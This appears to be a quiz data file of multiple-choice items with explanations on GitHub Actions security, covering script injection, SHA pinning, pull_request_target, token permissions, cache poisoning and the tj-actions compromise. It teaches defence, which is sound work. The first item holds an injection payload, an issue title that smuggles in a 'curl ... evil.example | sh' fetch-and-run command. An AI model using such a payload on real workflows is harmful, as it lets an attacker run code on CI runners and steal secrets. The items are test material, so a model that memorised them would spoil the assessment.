questions.prompt: A step has `run: echo "Title: ${{ github.event.issue.title }}"`. An outsider opens an issue titled `"; curl -sSf https://evil.example | sh; #`. What happens?
choices: The shell prints the title literally, because it is inside double quotes
GitHub escapes event values before it runs the script
Nothing, because issues cannot start workflows
The curl command runs: the expression is substituted into the script text before the shell parses it
questions.explanation: `${{ }}` is template expansion done by GitHub before the shell starts, so the title's quote closes the echo string and the rest is a command. Passing the title through `env:` and reading `"$TITLE"` makes it data, because the shell expands variables after parsing.

questions.prompt: Which `uses:` reference cannot be changed by the action's owner after you have reviewed the code it points at?
choices: `actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1`
`actions/checkout@v7.0.1`
`actions/checkout@main`
`actions/checkout@v7`
questions.explanation: Branches and tags, including full version tags like `v7.0.1`, are pointers that anyone with write access can move. A full 40-character commit SHA names the content itself. A lockfile records the same pin outside the workflow file.

questions.prompt: A `pull_request_target` workflow checks out `github.event.pull_request.head.sha` and runs `npm ci`. Why is that critical even though the job only has `contents: read`?
choices: It is not critical; a read-only token cannot do any harm
The contributor's install scripts run in the base repository's context, with the repository's secrets, its cache scope and whatever the token can read
`npm ci` never runs install scripts
GitHub refuses to check out fork code in `pull_request_target`
questions.explanation: This is a pwn request. The trigger runs the base workflow with the base repository's secrets, so the contributor's `preinstall` script gets them, can read private code with the token, and can write cache entries if the job's cache mode allows it. Build untrusted code under `pull_request` instead.

questions.prompt: A job's only step runs `gh pr comment "$PR" --body done`. Which token configuration is least privilege?
choices: `permissions: write-all`
No `permissions:` block, so the default applies
`permissions:` with only `pull-requests: write`, and `permissions: {}` at the workflow level
`permissions: read-all`
questions.explanation: Listing a scope sets every unlisted scope to `none`, so `pull-requests: write` alone is exactly what commenting needs. With no block the owner's default applies, which is read and write on most scopes unless the restricted default was chosen.

questions.prompt: A release workflow, started by a tag push, restores `node_modules` with `actions/cache`. What makes that exploitable?
choices: Nothing, because each workflow has its own cache
Only a cache key that does not use `hashFiles()`

Any job that runs untrusted code and can save into the default branch's cache scope, for example a `pull_request_target` job with an explicit `cache-mode: write`, can plant an entry the release restores without verification
Tag pushes cannot read caches at all
questions.explanation: Cache entries are not signed and the default branch's scope is shared by all its workflows. Current GitHub gives low-trust triggers read-only cache access unless a `cache-mode` lifts it; release jobs should not restore caches at all (`cache-mode: none` or no cache step).

questions.prompt: In March 2025 the tags of `tj-actions/changed-files` were moved to a malicious commit. Why did workflows that pinned the action to a commit SHA leak nothing?
choices: GitHub blocked the action for everyone within minutes
SHA-pinned actions receive no secrets
The attacker could only move tags; a pinned SHA names the old commit's content, so those workflows kept running the code that had been reviewed
Dependabot reverted the tag change in every repository
questions.explanation: A tag is a movable pointer; a commit SHA is a content hash. The compromised code printed runner secrets, double base64-encoded, into build logs of every workflow that resolved the moved tags. Pins with a bot to update them, or a workflow lockfile, close that path.
